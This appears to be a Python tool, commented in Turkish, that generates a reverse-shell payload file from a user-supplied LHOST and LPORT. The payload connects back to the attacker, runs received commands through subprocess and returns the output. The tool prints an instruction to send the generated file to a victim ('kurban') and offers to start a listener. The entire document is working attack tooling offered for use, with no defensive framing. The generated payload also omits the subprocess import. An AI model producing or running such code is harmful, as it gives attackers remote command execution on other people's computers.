# coding=utf-8
# ©xyxalpha - tht


import socket
from colorama import Fore, Back, Style
#hazir reverse_shell olusturma


dosya_ismi = input(Fore.GREEN+">>>[+]DOSYA İSMİ: ")
uzanti = dosya_ismi+".py"
lhost = input(Fore.GREEN+">>>[+]LHOST GİRİNİZ: ")
lport = input(Fore.GREEN+">>>[+]LPORT GİRİNİZ: ")

reverse_shell=""" 


#reverse_shell kurban

import socket

host = "{}"
port = {}
soket = socket.socket()
soket.connect((host,port))
mesaj = soket.recv(1024).decode()
print(mesaj)

while True:

    komut = soket.recv(1024).decode()
    if komut.lower()=="exit":
        break
    cikti = subprocess.getoutput(komut)

    soket.send(cikti.encode())

soket.close()





""".format(lhost,lport)

dosya = open(uzanti,"w")
yaz = dosya.write(reverse_shell)
dosya.close()

print(Fore.BLUE+"[*] 'reverse_shell' DOSYASI OLUSTURULDU / program klasörü / {}".format(uzanti))
print(Fore.GREEN+"[*] OLUŞTURULAN DOSYAYI BİR KURBANA YOLLAYINIZ")
print(Fore.YELLOW+"LHOST: {}".format(lhost))
print(Fore.YELLOW+"LPORT: {}".format(lport))

print("\n")
dinle = input(Fore.YELLOW+">>>[+]DİNLEMEK İSTERMİSİNİZ?  [e]/[h] :")

if dinle == "e" or dinle == "E":

    import shell_dinle

elif dinle == "h" or dinle == "H":

    print(Fore.MAGENTA+">>>[*] DİNLEME İPTAL EDİLDİ / DAHA SONRA DİNLEYEBİLİRSİNİZ*")


